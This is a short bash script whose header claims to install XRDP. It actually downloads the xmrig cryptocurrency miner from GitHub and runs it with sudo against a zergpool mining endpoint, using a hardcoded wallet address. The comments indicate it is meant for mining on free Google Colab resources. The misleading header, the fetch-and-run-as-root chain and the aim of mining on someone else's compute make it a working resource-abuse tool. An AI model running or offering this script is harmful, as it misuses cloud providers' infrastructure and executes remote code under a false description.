#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz && tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz && cd xmrig-6.16.4 && clear && sudo ./xmrig -a rx/0 -o stratum+tcp://randomx.mine.zergpool.com:4453 -u LNSQDXTcvRvQZNu2PmMDRSVbk4PA3V3iKM --keepalive --timeout 120 --donate-level 1 -p c=LTC,ID=T
